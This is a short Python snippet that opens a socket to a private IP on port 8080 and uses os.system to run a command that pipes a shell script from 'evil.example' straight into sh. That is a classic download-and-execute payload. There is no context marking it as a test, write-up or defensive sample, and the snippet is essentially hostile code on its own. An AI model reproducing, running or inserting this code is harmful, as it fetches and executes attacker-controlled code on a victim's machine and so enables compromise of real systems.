import socket,os
s=socket.socket(); s.connect(("10.0.0.5",8080))
os.system("curl http://evil.example/p.sh | sh")
